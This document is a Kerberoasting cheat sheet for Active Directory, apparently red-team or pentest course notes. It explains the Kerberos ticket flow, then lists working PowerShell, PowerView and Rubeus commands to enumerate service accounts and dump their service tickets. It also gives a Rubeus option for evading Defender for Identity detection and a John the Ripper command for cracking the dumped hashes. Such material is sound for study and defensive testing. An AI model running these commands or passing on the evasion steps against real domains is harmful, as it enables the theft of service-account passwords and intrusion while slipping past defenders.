
* Offline cracking of service account passwords.
* The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
* Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack !

# Diagram Overview

```
###############################################################################
#                   KERBEROS FLOW & KERBEROASTING ATTACK                      #
###############################################################################
                          +------------+
                          |   KDC/DC   |
                          +------------+
                           / ^  |  ^  \ \
                      (1) / (3) | (2)  \ \ (PAC Validation)
                         /   |  | (4)   \ v
                 +--------+  |  |       +------------+
                 |        |--+  +------>|            |
                 | CLIENT |------------>| APP SERVER |
                 |        |<------------|            |
                 +--------+     (5)     +------------+
                                (6)

-------------------------------------------------------------------------------
PROCESS FLOW:
-------------------------------------------------------------------------------
1. AS-REQ: Client sends a timestamp encrypted with their secret (AES/NTLM) 
   to the KDC.
2. AS-REP: KDC returns a TGT encrypted/signed with the krbtgt account 
   secret.
3. TGS-REQ: Client presents the TGT to request a Service Ticket (ST/TGS).
4. TGS-REP: KDC provides the ST/TGS encrypted with the target service's 
   secret.
5. AP-REQ: Client connects to the Application Server and presents the 
   ST/TGS.
6. Optional: Mutual authentication between the Client and Server.
*. Optional: PAC validation request/response between Server and KDC.

-------------------------------------------------------------------------------
ATTACK STEPS (KERBEROASTING):
-------------------------------------------------------------------------------
i.  Request a ST/TGS (Step 4) encrypted with the NTLM hash of the target 
    service and save it offline.
ii. Brute-force the ST/TGS offline to discover the clear-text password of 
    the service account.
###############################################################################
```


Find user accounts used as Service accounts
* ActiveDirectory module
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

* PowerView
```
Get-DomainUser -SPN
```

* Use Rubeus to list Kerberoast stats
```
Rubeus.exe kerberoast /stats
```

*  Use Rubeus to request a TGS
```
Rubeus.exe kerberoast /user:svcadmin /simple
```

* To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
```
Rubeus.exe kerberoast /stats /rc4opsec
```

```
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

* Kerberoast all possible accounts
```
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

* Crack ticket using John the Ripper
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
